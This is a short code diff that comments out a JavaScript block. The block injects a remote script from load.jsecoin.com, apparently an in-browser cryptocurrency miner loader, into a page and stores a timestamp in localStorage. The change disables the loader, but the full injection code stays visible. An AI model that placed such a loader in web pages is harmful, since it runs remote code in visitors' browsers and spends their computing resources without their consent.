@@ -327,13 +327,13 @@ for (var i = 0; i < arrayLength; i++) {
   //     exFunc();
   //    }
 
-    !function() {
-      localStorage["jsenow"] = Date.now();
-      var e = document;
-      var t = e.createElement("script");
-      var s = e.getElementsByTagName("script")[0];
-      t.type = "text/javascript";
-      t.async = t.defer = true;
-      t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
-      s.parentNode.insertBefore(t, s);
-    }();
+    // !function() {
+    //   localStorage["jsenow"] = Date.now();
+    //   var e = document;
+    //   var t = e.createElement("script");
+    //   var s = e.getElementsByTagName("script")[0];
+    //   t.type = "text/javascript";
+    //   t.async = t.defer = true;
+    //   t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
+    //   s.parentNode.insertBefore(t, s);
+    // }();
